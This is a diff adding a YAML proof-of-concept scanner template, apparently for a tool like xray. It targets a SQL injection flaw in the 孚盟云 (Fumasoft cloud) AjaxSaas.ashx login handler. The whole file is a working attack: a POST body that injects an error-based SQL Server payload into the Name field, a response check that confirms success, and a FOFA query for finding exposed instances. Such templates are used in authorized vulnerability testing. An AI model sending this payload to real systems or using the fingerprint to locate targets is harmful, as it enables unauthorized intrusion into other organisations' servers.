@@ -1,0 +1,21 @@
+id: poc-yaml-fumasoft-ajaxsaas-ashx-sqli
+info:
+  name: 孚盟云 AjaxSaas.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 孚盟云
+  fofa: app="孚盟软件-孚盟云"
+variables:
+  t1: random_int(100,1000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /Ajax/AjaxSaas.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: action=Login&Name=2'+and+1=sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--+&pwd=1&validateCode=&checkValidateCode=0
+  expression: status_code == 200 && contains(body,t2) && matches(body,"转换成数据类型(.*?)时失败")
+    && matches(body,"在将(.*?)值")
+transport: http
